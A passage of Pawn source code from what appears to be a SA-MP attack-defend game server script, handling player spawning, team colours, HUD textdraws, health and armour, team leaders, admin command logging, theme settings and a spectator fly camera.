					        case ATTACKER: SetPlayerColor(playerid, ATTACKER_NOT_PLAYING);
					        case DEFENDER: SetPlayerColor(playerid, DEFENDER_NOT_PLAYING);
						}
			        }
					case ATTACKER:
					{
			            Player[playerid][Team] = ATTACKER;
			            SetPlayerColor(playerid, ATTACKER_NOT_PLAYING);
					}
					case DEFENDER:
					{
					    Player[playerid][Team] = DEFENDER;
					    SetPlayerColor(playerid, DEFENDER_NOT_PLAYING);
					}
				}
			}
		}
		else if(team == 1)
		{
			Player[playerid][Team] = ATTACKER;
			SetPlayerColor(playerid, ATTACKER_NOT_PLAYING);
		}
		else if(team == 2)
		{
		    Player[playerid][Team] = DEFENDER;
		    SetPlayerColor(playerid, DEFENDER_NOT_PLAYING);
		}

		SetPlayerWeather(playerid, Player[playerid][Weather]);
		SetPlayerTime(playerid, Player[playerid][Time], 0);

        HPArmourBaseID_VS_TD(playerid);

		new iString[180];
		if(Player[playerid][TextPos] == false)
			format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDamage ~r~%.0f~n~%sTotal Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[playerid][RoundKills], MAIN_TEXT_COLOUR, Player[playerid][RoundDamage], MAIN_TEXT_COLOUR, Player[playerid][TotalDamage]);
		else
			format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDmg ~r~%.0f~n~%sT. Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[playerid][RoundKills], MAIN_TEXT_COLOUR, Player[playerid][RoundDamage], MAIN_TEXT_COLOUR, Player[playerid][TotalDamage]);
		PlayerTextDrawSetString(playerid, RoundKillDmgTDmg, iString);

		PlayerTextDrawShow(playerid, FPSPingPacket);
		PlayerTextDrawShow(playerid, RoundKillDmgTDmg);

		#if ANTICHEAT == 1
		if(AntiCheat == true)
			TextDrawShowForPlayer(playerid, ACText);
		#endif
		TextDrawSetString(WebText, WebString);
	    TextDrawShowForPlayer(playerid, WebText);

   		new str1[128];
		str1 = "~r~Round Paused";

	    if(RoundPaused == true)
		{
		    TextDrawSetString(PauseTD, str1);
			TextDrawShowForAll(PauseTD);
		}

		for(new i = 0; i < 3; i++)
		{
			PlayerTextDrawShow(playerid, DoingDamage[i]);
			PlayerTextDrawShow(playerid, GettingDamaged[i]);
		}

		if(Current != -1)
	 	{
			foreach(new i:Player)
			{
				if(Player[i][Style] == 0) TextDrawShowForPlayer(i, RoundStats);
				else ShowRoundStats(i);
			}
		}

		if(Player[playerid][ShowSpecs])
		{
			PlayerTextDrawShow(playerid, WhoSpec[0]);
			PlayerTextDrawShow(playerid, WhoSpec[1]);
		}
		else
		{
		    PlayerTextDrawHide(playerid, WhoSpec[0]);
			PlayerTextDrawHide(playerid, WhoSpec[1]);
		}


		TextDrawShowForPlayer(playerid, TeamHpLose[0]);
		TextDrawShowForPlayer(playerid, TeamHpLose[1]);
        TextDrawShowForPlayer(playerid, AttHpLose);
        TextDrawShowForPlayer(playerid, DefHpLose);

		PlayerTextDrawShow(playerid, TD_RoundSpec);
        PlayerTextDrawShow(playerid, HPTextDraw_TD);
        PlayerTextDrawShow(playerid, ArmourTextDraw);
		PlayerTextDrawShow(playerid, BaseID_VS);
		ShowPlayerProgressBar(playerid, HealthBar);
		ShowPlayerProgressBar(playerid, ArmourBar);

        if(WarMode == true)
		{
			TextDrawShowForPlayer(playerid, RoundsPlayed);
			TextDrawShowForPlayer(playerid, TeamScoreText);
		}

		Player[playerid][Spawned] = true;
		SpawnPlayer(playerid);

		LoadPlayerVariables(playerid);
		RadarFix();
	}
	return 1;
}

//------------------------------------------------------------------------------
// Stocks
//------------------------------------------------------------------------------

stock SetHP(playerid, Float:amount)
{
	if(FallProtection == false)
	{
		PlayerTextDrawSetString(playerid, HPTextDraw_TD, sprintf("%s%.0f", MAIN_TEXT_COLOUR, amount));
	}
	else
	{
		if(Player[playerid][Playing] == true)
			PlayerTextDrawSetString(playerid, HPTextDraw_TD, sprintf("%sFall Prot.", MAIN_TEXT_COLOUR));
		else
		{
			PlayerTextDrawSetString(playerid, HPTextDraw_TD, sprintf("%s%.0f", MAIN_TEXT_COLOUR, amount));
		}
	}
	
	PlayerHealth[playerid] = amount;
	Player[playerid][pHealth] = amount;
	SetPlayerProgressBarValue(playerid, HealthBar, amount);
	if(amount <= 0.0)
	{
	    //ServerOnPlayerDeath(playerid, Player[playerid][HitBy], Player[playerid][HitWith]);
		SetTimerEx("ServerOnPlayerDeath", 200, false, "iii", playerid, Player[playerid][HitBy], Player[playerid][HitWith]);
	    HidePlayerProgressBar(playerid, HealthBar);
	}
	else
	{
		SetPlayerHealth(playerid, 65536 + amount);
		if(IsPlayerProgressBarShown(playerid, HealthBar) == false)
			ShowPlayerProgressBar(playerid, HealthBar);
	}
	return 1;
}

stock SetAP(playerid, Float:amount)
{
	if(Player[playerid][pArmour] > 0) {
		PlayerTextDrawSetString(playerid, ArmourTextDraw, sprintf("%s~h~~h~%.0f", MAIN_TEXT_COLOUR, amount));
	} else {
	    PlayerTextDrawSetString(playerid, ArmourTextDraw, "_");
	}
	
	PlayerArmour[playerid] = amount;
	Player[playerid][pArmour] = amount;
	SetPlayerProgressBarValue(playerid, ArmourBar, amount);
	if(amount <= 0.0)
	{
	    SetPlayerArmour(playerid, 0.0);
	    HidePlayerProgressBar(playerid, ArmourBar);
	}
	else
	{
		SetPlayerArmour(playerid, 65536 + amount);
		if(IsPlayerProgressBarShown(playerid, ArmourBar) == false)
			ShowPlayerProgressBar(playerid, ArmourBar);
	}
	return 1;
}

stock GetHP(playerid, &Float:health)
{
	health = PlayerHealth[playerid];
	return 1;
}

stock GetAP(playerid, &Float:armour)
{
	armour = PlayerArmour[playerid];
	return 1;
}



forward HidePlayerDeathMessage(playerid);
public HidePlayerDeathMessage(playerid)
{
    PlayerTextDrawHide(playerid, DeathMessage[0]);
    PlayerTextDrawHide(playerid, DeathMessage[1]);
	return 1;
}

stock ShowPlayerDeathMessage(killerid, playerid)
{
	if(!strcmp("NO_DEATH_MESSAGE", DeathMessageStr[killerid], false))
	    return 0;
	    
	PlayerTextDrawSetString(playerid, DeathMessage[0], sprintf("A death diss from %s", Player[killerid][Name]));
    PlayerTextDrawSetString(playerid, DeathMessage[1], sprintf("%s", DeathMessageStr[killerid]));
	PlayerTextDrawShow(playerid, DeathMessage[0]);
    PlayerTextDrawShow(playerid, DeathMessage[1]);
    SetTimerEx("HidePlayerDeathMessage", 6000, false, "i", playerid);
	return 1;
}

stock StyleTextDrawFix(playerid)
{
	if(Current != -1)
	{
		switch(Player[playerid][Style])
		{
		    case 0:
		    {
				HideRoundStats(playerid);
		        TextDrawShowForPlayer(playerid, RoundStats);
		    }
		    case 1:
		    {
		        TextDrawHideForPlayer(playerid, RoundStats);
		        ShowRoundStats(playerid);
		    }
		}
	}
	else
	{
	    HideRoundStats(playerid);
	    TextDrawHideForPlayer(playerid, RoundStats);
	}
	return 1;
}

stock RecountPlayersOnCP()
{
	PlayersInCP = 0;
	foreach(new i : Player)
	{
	    if(IsPlayerInCheckpoint(i))
	    {
	        OnPlayerEnterCheckpoint(i);
		}
		else
		    Player[i][WasInCP] = false;
	}
	if(PlayersInCP == 0)
	{
	    CurrentCPTime = ConfigCPTime;
	    TextDrawHideForAll(EN_CheckPoint);
	}
	return PlayersInCP;
}

stock RemoveUselessObjects(playerid)
{
    RemoveBuildingForPlayer(playerid, 1220, 0.0, 0.0, 0.0, 6000.0); // boxes that make you lose hp
	RemoveBuildingForPlayer(playerid, 1221, 0.0, 0.0, 0.0, 6000.0); // boxes that make you lose hp
	RemoveBuildingForPlayer(playerid, 1230, 0.0, 0.0, 0.0, 6000.0); // boxes that make you lose hp
	RemoveBuildingForPlayer(playerid, 1299, 0.0, 0.0, 0.0, 6000.0); // boxes that make you lose hp
	RemoveBuildingForPlayer(playerid, 1421, 0.0, 0.0, 0.0, 6000.0); // boxes that make you lose hp
	RemoveBuildingForPlayer(playerid, 1448, 0.0, 0.0, 0.0, 6000.0); // boxes that make you lose hp
	RemoveBuildingForPlayer(playerid, 1449, 0.0, 0.0, 0.0, 6000.0); // boxes that make you lose hp
	RemoveBuildingForPlayer(playerid, 1450, 0.0, 0.0, 0.0, 6000.0); // boxes that make you lose hp
	RemoveBuildingForPlayer(playerid, 1440, 0.0, 0.0, 0.0, 6000.0);
	RemoveBuildingForPlayer(playerid, 1421, 0.0, 0.0, 0.0, 6000.0);
	RemoveBuildingForPlayer(playerid, 1438, 0.0, 0.0, 0.0, 6000.0);
	RemoveBuildingForPlayer(playerid, 1338, 0.0, 0.0, 0.0, 6000.0);
	RemoveBuildingForPlayer(playerid, 1219, 0.0, 0.0, 0.0, 6000.0);
	RemoveBuildingForPlayer(playerid, 1676, 0.0, 0.0, 0.0, 6000.0); // exploding gas tank
	RemoveBuildingForPlayer(playerid, 1686, 0.0, 0.0, 0.0, 6000.0);
	return 1;
}

stock AddFoxGlitchFix()
{
    new obj = CreateObject(19353, 2487.883789, -1962.822143, 13.53077, 0, 0, -88.483413);
   	SetObjectMaterialText(obj, "GG FOX", 0, 50);

   	obj = CreateObject(19353, 2489.435302, -1961.161254, 13.538647, 0, 0, 0.368316);
   	SetObjectMaterialText(obj, "FAIL", 0, 50);

   	obj = CreateObject(19353, 2486.198486, -1961.272705, 13.537899, 0, 0, 183.032867);
   	SetObjectMaterialText(obj, "FAIL", 0, 50);
	return 1;
}

/*
stock ShowHitArrow(playerid, hitterid)
{
	// if last hit by the same then break
	new Float:hitangleZ, Float:hitangleY = 90.0;
 	GetPlayerFacingAngle(hitterid, hitangleZ);
 	//hitangleZ -= 180.0;
 	new Float:pX, Float:pY, Float:pZ;
 	GetPlayerPos(playerid, pX, pY, pZ);
 	new Float:oX, Float:oY, Float:oZ;
 	GetPlayerPos(hitterid, oX, oY, oZ);
 	new Float:countZ = 0.0;
 	new bool:arrowDown = false;
 	if(oZ != pZ)
 	{
 	    if(oZ > pZ)
 	    {
 	        countZ = oZ - pZ;
 	    }
 	    else
 	    {
 	        countZ = pZ - oZ;
 	        arrowDown = true;
 	    }
 	}
 	if(countZ == 0.0)
		hitangleY = 90.0;
	else if((pX == oX) && (pY == oY) && (pZ != oZ))
	    hitangleY = 0.0;
	else
	{
	    new Float:distancePandO = GetDistanceBetweenPlayers(playerid, hitterid);
        hitangleY = asin(countZ / distancePandO);
        if(arrowDown == true)
            hitangleY += 180.0;
		printf("hitangleY: %f", hitangleY);
	}
 	new objID;
 	new rnd = random(4);
	switch(rnd)
	{
	    case 0:
	    {
	        objID = CreatePlayerObject(playerid, 19134, pX + randomExFloat(1.0, 2.0), pY + randomExFloat(1.0, 2.0), pZ + randomExFloat(1.0, 2.0), 0.0, hitangleY, hitangleZ, 0.0);
	    }
	    case 1:
		{
		    objID = CreatePlayerObject(playerid, 19134, pX - randomExFloat(1.0, 2.0), pY + randomExFloat(1.0, 2.0), pZ + randomExFloat(1.0, 2.0), 0.0, hitangleY, hitangleZ, 0.0);
		}
		case 2:
		{
		    objID = CreatePlayerObject(playerid, 19134, pX + randomExFloat(1.0, 2.0), pY - randomExFloat(1.0, 2.0), pZ + randomExFloat(1.0, 2.0), 0.0, hitangleY, hitangleZ, 0.0);
		}
		case 3:
		{
		    objID = CreatePlayerObject(playerid, 19134, pX - randomExFloat(1.0, 2.0), pY - randomExFloat(1.0, 2.0), pZ + randomExFloat(1.0, 2.0), 0.0, hitangleY, hitangleZ, 0.0);
		}
	}
	// set material colour
	SetTimerEx("DestroyHitObject", 5000, false, "ii", playerid, objID);
	return 1;
}


forward DestroyHitObject(playerid, objectid);
public DestroyHitObject(playerid, objectid)
{
	DestroyPlayerObject(playerid, objectid);
	return 1;
}
*/

stock randomExFloat(Float:min, Float:max)
{
	new rand = random(floatround(max-min, floatround_round))+floatround(min, floatround_round);
	return rand;
}

stock randomExInt(min, max)
{
	return random(max-min) + min;
}

stock PlayerLeadTeam(playerid, bool:force, bool:message = true)
{
    new team = Player[playerid][Team];

    if(!force && TeamHasLeader[team] == true)
        return 0;

    TeamLeader[team] = playerid;
	TeamHasLeader[team] = true;
	if(message)
	{
	 	foreach(new i : Player)
		{
		    if(team == ATTACKER)
		    {
		        if(Player[i][Team] == ATTACKER || Player[i][Team] == ATTACKER_SUB)
		        {
		            SendClientMessage(i, -1, sprintf("%s%s {FFFFFF}is now leading the team.", TextColor[team], Player[playerid][Name]));
		        }
		    }
		    else if(team == DEFENDER)
		    {
		        if(Player[i][Team] == DEFENDER || Player[i][Team] == DEFENDER_SUB)
		        {
		            SendClientMessage(i, -1, sprintf("%s%s {FFFFFF}is now leading the team.", TextColor[team], Player[playerid][Name]));
		        }
		    }
		    if(i == playerid)
				continue;

			if(GetPlayerColor(i) == TEAM_LEADER_COLOUR)
				ColorFix(i);
		}
	}
	SetPlayerColor(playerid, TEAM_LEADER_COLOUR);
    RadarFix();
	return 1;
}

stock PlayerNoLeadTeam(playerid)
{
    new team = Player[playerid][Team];

	if(TeamHasLeader[team] == true && TeamLeader[team] == playerid)
	{
	    TeamLeader[team] = INVALID_PLAYER_ID;
		TeamHasLeader[team] = false;
		foreach(new i : Player)
		{
		    if(team == ATTACKER)
		    {
		        if(Player[i][Team] == ATTACKER || Player[i][Team] == ATTACKER_SUB)
		        {
		            SendClientMessage(i, -1, sprintf("%s%s {FFFFFF}is no longer leading the team.", TextColor[team], Player[playerid][Name]));
		        }
		    }
		    else if(team == DEFENDER)
		    {
		        if(Player[i][Team] == DEFENDER || Player[i][Team] == DEFENDER_SUB)
		        {
		            SendClientMessage(i, -1, sprintf("%s%s {FFFFFF}is no longer leading the team.", TextColor[team], Player[playerid][Name]));
		        }
		    }
		}
	    switch(team)
	    {
	        case 0:
	        {
	            AttackerAskingHelp(playerid);
			}
	        case 1:
	        {
	            DefenderAskingHelp(playerid);
			}
	    }
	}
	ColorFix(playerid);
	RadarFix();
	return 1;
}

stock ResetTeamLeaders()
{
	for(new team = 0; team < MAX_TEAMS; team ++)
	{
	    if(TeamHasLeader[team] == true)
		{
			if(IsPlayerConnected(TeamLeader[team]))
			{
				ColorFix(TeamLeader[team]);
			}
		    TeamLeader[team] = INVALID_PLAYER_ID;
			TeamHasLeader[team] = false;
		}
	}
	RadarFix();
	return 1;
}


/*
Function: LogAdminCommand
cmd[]: the entered command
adminid: the admin who enters the command
playerid: the player who the command hits (use INVALID_PLAYER_ID to ignore this)
*/
stock LogAdminCommand(cmd[], adminid, playerid)
{
	new File:log = fopen("admin_command_log.txt", io_append);
	new Year, Month, Day;
	getdate(Year, Month, Day);
	new Hours, Minutes, Seconds;
	gettime(Hours, Minutes, Seconds);
  	if(playerid != INVALID_PLAYER_ID)
  	{
		fwrite(log, sprintf("[%02d/%02d/%d][%02d:%02d:%02d] %s [%d] has used the command (/%s) at %s [%d]. \r\n", Day, Month, Year, Hours, Minutes, Seconds, Player[adminid][Name], adminid, cmd, Player[playerid][Name], playerid));
   	}
  	else
	{
		fwrite(log, sprintf("[%02d/%02d/%d][%02d:%02d:%02d] %s [%d] has used the command (/%s). \r\n", Day, Month, Year, Hours, Minutes, Seconds, Player[adminid][Name], adminid, cmd));
  	}
  	fclose(log);
  	return 1;
}

stock ClearAdminCommandLog()
{
    new File:log = fopen("admin_command_log.txt", io_write);
    fwrite(log, "");
    fclose(log);
	return 1;
}

stock DamagePlayer(playerid, Float:amnt)
{
	new Float:toReturn;
	new Float:temp_hp, Float:temp_arm;
	GetHP(playerid, temp_hp);
	GetAP(playerid, temp_arm);
	if(temp_arm < 0.1)
	{
		if(temp_hp < temp_arm)
			amnt = temp_hp;
	}
	if(temp_arm <= 0)
	{
		SetHP(playerid, temp_hp - amnt);
		toReturn = temp_hp - amnt;
	}
	else if(temp_arm >= 1.00)
	{
		new Float:minus_result = temp_arm - amnt;
		// printf("%f", minus_result); //For debug.
		if(minus_result <= 0.00)
		{
			SetAP(playerid, 0.00);
			SetHP(playerid, minus_result + temp_hp);
			toReturn = minus_result + temp_hp;
		}
		else if(minus_result >= 1.00)
		{
			SetAP(playerid, minus_result);
			toReturn = minus_result;
		}
	}
	return _:toReturn;
}

stock SaveThemeSettings()
{
    new query[256];

	format(query, sizeof(query), "UPDATE `Configs` SET `Value` = '%s' WHERE `Option` = 'MainTextColour'", DB_Escape(MAIN_TEXT_COLOUR));
	db_free_result(db_query(sqliteconnection, query));

	format(query, sizeof(query), "UPDATE `Configs` SET `Value` = %d WHERE `Option` = 'MainBackgroundColour'", MAIN_BACKGROUND_COLOUR);
	db_free_result(db_query(sqliteconnection, query));
	return 1;
}

stock ChangeTheme(playerid, listitem)
{
	switch(listitem)
	{
		case 0: // White (Background) & Black (Text)
		{
		    format(MAIN_TEXT_COLOUR, sizeof MAIN_TEXT_COLOUR, "~l~");
		    MAIN_BACKGROUND_COLOUR = 0xEEEEEE33;
		}
		case 1: // Black (Background) & White (Text)
		{
            format(MAIN_TEXT_COLOUR, sizeof MAIN_TEXT_COLOUR, "~w~");
		    MAIN_BACKGROUND_COLOUR = 0x00000044;
		}
		case 2: // White (Background) & Red (Text)
		{
            format(MAIN_TEXT_COLOUR, sizeof MAIN_TEXT_COLOUR, "~r~");
		    MAIN_BACKGROUND_COLOUR = 0xEEEEEE33;
		}
		case 3: // Black (Background) & Red (Text)
		{
            format(MAIN_TEXT_COLOUR, sizeof MAIN_TEXT_COLOUR, "~r~");
		    MAIN_BACKGROUND_COLOUR = 0x00000044;
		}
		case 4: // White (Background) & Blue (Text)
		{
            format(MAIN_TEXT_COLOUR, sizeof MAIN_TEXT_COLOUR, "~b~");
		    MAIN_BACKGROUND_COLOUR = 0xEEEEEE33;
		}
		case 5: // Black (Background) & Blue (Text)
		{
            format(MAIN_TEXT_COLOUR, sizeof MAIN_TEXT_COLOUR, "~b~");
		    MAIN_BACKGROUND_COLOUR = 0x00000044;
		}
		case 6: // White (Background) & Green (Text)
		{
            format(MAIN_TEXT_COLOUR, sizeof MAIN_TEXT_COLOUR, "~g~");
		    MAIN_BACKGROUND_COLOUR = 0xEEEEEE33;
		}
		case 7: // Black (Background) & Green (Text)
		{
            format(MAIN_TEXT_COLOUR, sizeof MAIN_TEXT_COLOUR, "~g~");
		    MAIN_BACKGROUND_COLOUR = 0x00000044;
		}
		case 8: // White (Background) & Purple (Text)
		{
            format(MAIN_TEXT_COLOUR, sizeof MAIN_TEXT_COLOUR, "~p~");
		    MAIN_BACKGROUND_COLOUR = 0xEEEEEE33;
		}
		case 9: // Black (Background) & Purple (Text)
		{
            format(MAIN_TEXT_COLOUR, sizeof MAIN_TEXT_COLOUR, "~p~");
		    MAIN_BACKGROUND_COLOUR = 0x00000044;
		}
	}
	SaveThemeSettings();
	SendClientMessageToAll(-1, sprintf("%s has set up a new theme colour. Server is restarting so the changes can take effect.", Player[playerid][Name]));
	SendRconCommand("gmx");
	return 1;
}

stock ResetDuellersToTheirTeams(dueller1, dueller2)
{
	Player[dueller1][Team] = Player[dueller1][TeamBeforeDuel];
	Player[dueller2][Team] = Player[dueller2][TeamBeforeDuel];
    SwitchTeamFix(dueller1);
    SwitchTeamFix(dueller2);
	SpawnPlayerEx(dueller1);
	SpawnPlayerEx(dueller2);
	return 1;
}

stock SetPlayerTeamEx(playerid, teamid) {
	if(ServerAntiLag == false) SetPlayerTeam(playerid, teamid);
	else SetPlayerTeam(playerid, ANTILAG_TEAM);
}

stock SetSpawnInfoEx(playerid, teamid, skin, Float:xXx, Float:yYy, Float:zZz, Float:aAa, w1, a1, w2, a2, w3, a3) {
	if(ServerAntiLag == false) SetSpawnInfo(playerid, teamid, skin, xXx, yYy, zZz, aAa, w1, a1, w2, a2, w3, a3);
	else SetSpawnInfo(playerid, ANTILAG_TEAM, skin, xXx, yYy, zZz, aAa, w1, a1, w2, a2, w3, a3);
}

stock MoveIt(playerid, Float:toX, Float:toY, Float:toZ)
{
    new Float:FV[3], Float:CP[3];
	GetPlayerCameraPos(playerid, CP[0], CP[1], CP[2]);          // 	Cameras position in space
    GetPlayerCameraFrontVector(playerid, FV[0], FV[1], FV[2]);  //  Where the camera is looking at

	// Increases the acceleration multiplier the longer the key is held
	if(noclipdata[playerid][accelmul] <= 1) noclipdata[playerid][accelmul] += ACCEL_RATE;

	// Determine the speed to move the camera based on the acceleration multiplier
	new Float:speed = MOVE_SPEED * noclipdata[playerid][accelmul];

	// Calculate the cameras next position based on their current position and the direction their camera is facing
	MovePlayerObject(playerid, noclipdata[playerid][flyobject], toX - 20.0, toY - 10.0, toZ + 40.0, speed + 1000.0);

	// Store the last time the camera was moved as now
	noclipdata[playerid][lastmove] = GetTickCount();
	return 1;
}

stock PlayerFlyMode(playerid)
{
	// Create an invisible object for the players camera to be attached to
	if(Player[playerid][Spectating] == true) StopSpectate(playerid);

	if(Player[playerid][BeingSpeced] == true) {
	    foreach(new i : Player) {
	        if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == playerid) {
	            StopSpectate(i);
			}
		}
	}

	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(playerid, X, Y, Z);
	noclipdata[playerid][flyobject] = CreatePlayerObject(playerid, 19300, X, Y, Z, 0.0, 0.0, 0.0);

	// Place the player in spectating mode so objects will be streamed based on camera location
	TogglePlayerSpectating(playerid, true);
	// Attach the players camera to the created object
	AttachCameraToPlayerObject(playerid, noclipdata[playerid][flyobject]);

	noclipdata[playerid][FlyMode] = true;
	Player[playerid][Spectating] = true;
	noclipdata[playerid][cameramode] = CAMERA_MODE_FLY;

	SetPlayerVirtualWorld(playerid, 0);
	return 1;
}

forward SetPosAfterFly(playerid, Float:tX, Float:tY, Float:tZ);
public SetPosAfterFly(playerid, Float:tX, Float:tY, Float:tZ)
{
	SetPlayerPos(playerid, tX, tY, tZ);
	return 1;
}

stock CancelFlyMode(playerid/*, bool:setpos = true*/)
{
	noclipdata[playerid][FlyMode] = false;

	CancelEdit(playerid);
//	new Float:X, Float:Y, Float:Z;
//	GetPlayerCameraPos(playerid, X, Y, Z);
	TogglePlayerSpectating(playerid, false);
//	if(setpos)
//		SetTimerEx("SetPosAfterFly", 1000, false, "ifff", playerid, X, Y, Z);


	DestroyPlayerObject(playerid, noclipdata[playerid][flyobject]);
	noclipdata[playerid][cameramode] = CAMERA_MODE_NONE;
	return 1;
}


stock GetNextCameraPosition(move_mode, Float:CP[3], Float:FV[3], &Float:vX, &Float:vY, &Float:vZ)
{
    // Calculate the cameras next position based on their current position and the direction their camera is facing
    #define OFFSET_X (FV[0]*6000.0)
	#define OFFSET_Y (FV[1]*6000.0)
	#define OFFSET_Z (FV[2]*6000.0)
	switch(move_mode)
	{
		case MOVE_FORWARD:
		{
			vX = CP[0]+OFFSET_X;
			vY = CP[1]+OFFSET_Y;
			vZ = CP[2]+OFFSET_Z;
		}
		case MOVE_BACK:
		{
			vX = CP[0]-OFFSET_X;
			vY = CP[1]-OFFSET_Y;
			vZ = CP[2]-OFFSET_Z;
		}
		case MOVE_LEFT:
		{
			vX = CP[0]-OFFSET_Y;
			vY = CP[1]+OFFSET_X;
			vZ = CP[2];
		}
		case MOVE_RIGHT:
		{
			vX = CP[0]+OFFSET_Y;
			vY = CP[1]-OFFSET_X;
			vZ = CP[2];
		}
		case MOVE_BACK_LEFT:
		{
			vX = CP[0]+(-OFFSET_X - OFFSET_Y);
 			vY = CP[1]+(-OFFSET_Y + OFFSET_X);
		 	vZ = CP[2]-OFFSET_Z;
		}
		case MOVE_BACK_RIGHT:
		{
			vX = CP[0]+(-OFFSET_X + OFFSET_Y);
 			vY = CP[1]+(-OFFSET_Y - OFFSET_X);
		 	vZ = CP[2]-OFFSET_Z;
		}
		case MOVE_FORWARD_LEFT:
		{
			vX = CP[0]+(OFFSET_X  - OFFSET_Y);
			vY = CP[1]+(OFFSET_Y  + OFFSET_X);
			vZ = CP[2]+OFFSET_Z;
		}
		case MOVE_FORWARD_RIGHT:
		{
			vX = CP[0]+(OFFSET_X  + OFFSET_Y);
			vY = CP[1]+(OFFSET_Y  - OFFSET_X);
			vZ = CP[2]+OFFSET_Z;
		}
	}
}

stock MoveCamera(playerid)
{
	new Float:FV[3], Float:CP[3];
	GetPlayerCameraPos(playerid, CP[0], CP[1], CP[2]);          // 	Cameras position in space
    GetPlayerCameraFrontVector(playerid, FV[0], FV[1], FV[2]);  //  Where the camera is looking at

	// Increases the acceleration multiplier the longer the key is held
	if(noclipdata[playerid][accelmul] <= 1) noclipdata[playerid][accelmul] += ACCEL_RATE;

	// Determine the speed to move the camera based on the acceleration multiplier
	new Float:speed = MOVE_SPEED * noclipdata[playerid][accelmul];

	// Calculate the cameras next position based on their current position and the direction their camera is facing
	new Float:X, Float:Y, Float:Z;
	GetNextCameraPosition(noclipdata[playerid][noclipcammode], CP, FV, X, Y, Z);
	MovePlayerObject(playerid, noclipdata[playerid][flyobject], X, Y, Z, speed);

	// Store the last time the camera was moved as now
	noclipdata[playerid][lastmove] = GetTickCount();
	return 1;
}

stock GetMoveDirectionFromKeys(ud, lr)
{
	new direction = 0;

    if(lr < 0)
	{
		if(ud < 0) 		direction = MOVE_FORWARD_LEFT; 	// Up & Left key pressed
		else if(ud > 0) direction = MOVE_BACK_LEFT; 	// Back & Left key pressed
		else            direction = MOVE_LEFT;          // Left key pressed
	}
	else if(lr > 0) 	// Right pressed
	{
		if(ud < 0)      direction = MOVE_FORWARD_RIGHT;  // Up & Right key pressed
		else if(ud > 0) direction = MOVE_BACK_RIGHT;     // Back & Right key pressed
		else			direction = MOVE_RIGHT;          // Right key pressed
	}
	else if(ud < 0) 	direction = MOVE_FORWARD; 	// Up key pressed
	else if(ud > 0) 	direction = MOVE_BACK;		// Down key pressed

	return direction;
}

stock ShowTargetInfo(playerid, targetid)
{
	if(targetid == INVALID_PLAYER_ID || playerid == INVALID_PLAYER_ID)
		return 1;

	if(ServerAntiLag == false) {
		if(GetPlayerTeam(targetid) == GetPlayerTeam(playerid) && GetPlayerTeam(playerid) != NO_TEAM)
		    return 1;
	}
	
	new str[170];
	GetPlayerFPS(targetid);
	if(GetPlayerVehicleID(targetid) == 0)
	{
		format(str, sizeof str, "~n~~n~%sName: %s%s~n~%sPing: %s%d   %sFPS: %s%d~n~%sPL: %s%.1f   %sHP: %s%.0f",
			MAIN_TEXT_COLOUR, TDC[Player[targetid][Team]], Player[targetid][NameWithoutTag], MAIN_TEXT_COLOUR, TDC[Player[targetid][Team]],
			GetPlayerPing(targetid), MAIN_TEXT_COLOUR, TDC[Player[targetid][Team]], Player[targetid][FPS], MAIN_TEXT_COLOUR, TDC[Player[targetid][Team]], GetPlayerPacketLoss(targetid), MAIN_TEXT_COLOUR, TDC[Player[targetid][Team]], (Player[targetid][pHealth] + Player[targetid][pArmour]));
	}
	else
	{
	    new Float:vHP;
	    GetVehicleHealth(GetPlayerVehicleID(targetid), vHP);
        format(str, sizeof str, "~n~~n~%sName: %s%s~n~%sPing: %s%d   %sFPS: %s%d~n~%sPL: %s%.1f   %sHP: %s%.0f~n~%sVehicle HP: %s%.1f",
			MAIN_TEXT_COLOUR, TDC[Player[targetid][Team]], Player[targetid][NameWithoutTag], MAIN_TEXT_COLOUR, TDC[Player[targetid][Team]],
			GetPlayerPing(targetid), MAIN_TEXT_COLOUR, TDC[Player[targetid][Team]], Player[targetid][FPS], MAIN_TEXT_COLOUR, TDC[Player[targetid][Team]], GetPlayerPacketLoss(targetid), MAIN_TEXT_COLOUR, TDC[Player[targetid][Team]], (Player[targetid][pHealth] + Player[targetid][pArmour]), MAIN_TEXT_COLOUR, TDC[Player[targetid][Team]], vHP / 100);
	}
	PlayerTextDrawSetString(playerid, TargetInfoTD, str);
	PlayerTextDrawShow(playerid, TargetInfoTD);

	if(TargetInfoTimer[playerid] == -1)
	{
		 KillTimer(TargetInfoTimer[playerid]);
		 TargetInfoTimer[playerid] = SetTimerEx("HideTargetInfo", 4000, false, "i", playerid);
	}
	return 1;
}

forward HideTargetInfo(playerid);
public HideTargetInfo(playerid)
{
    TargetInfoTimer[playerid] = -1;
	PlayerTextDrawHide(playerid, TargetInfoTD);
	return 1;
}

/*  //a bitwise operation always faster though
 #define IsEven(%0) (!(%0 & 1))
*/

stock IsEven(integer)
{
	if(integer % 2 == 0)
		 return 1; // even
	return 0; // odd
}

stock IsSafeGametext(text[])
{
	new cnt = 0;
	for(new i = 0; i < strlen(text); i ++)
	{
		if(text[i] == '~')
			cnt ++;
	}
	if(IsEven(cnt) == 0)
		return 0;
	return 1;
}

stock ClearPlayerChat(playerid)
{
	SendClientMessage(playerid, -1, " ");
	SendClientMessage(playerid, -1, " ");
	SendClientMessage(playerid, -1, " ");
	SendClientMessage(playerid, -1, " ");
	SendClientMessage(playerid, -1, " ");
	SendClientMessage(playerid, -1, " ");
	SendClientMessage(playerid, -1, " ");
	SendClientMessage(playerid, -1, " ");
	SendClientMessage(playerid, -1, " ");
	SendClientMessage(playerid, -1, " ");
	return 1;
}

forward FixVsTextDraw();
public FixVsTextDraw()
{
	new iString[32];
	if(Current == -1)
	{
		new ct[2];
		foreach(new i : Player)
		{
			switch(Player[i][Team])
			{
			    case ATTACKER:
			    {
			        ct[0] ++;
			    }
			    case DEFENDER:
			    {
			        ct[1] ++;
			    }
			}
		}
	    format(iString, sizeof(iString), "~r~%d  %sVs  ~b~~h~%d", ct[0], MAIN_TEXT_COLOUR, ct[1]);
	}
	else
	{
		if(GameType == TDM)
		{
		    format(iString, sizeof(iString), "%sTDM %s(~r~%d%s)", MAIN_TEXT_COLOUR, MAIN_TEXT_COLOUR, Current, MAIN_TEXT_COLOUR);
		}
		else if(GameType == ARENA)
		{
			format(iString, sizeof(iString), "%sArena %s(~r~%d%s)", MAIN_TEXT_COLOUR, MAIN_TEXT_COLOUR, Current, MAIN_TEXT_COLOUR);
	    }
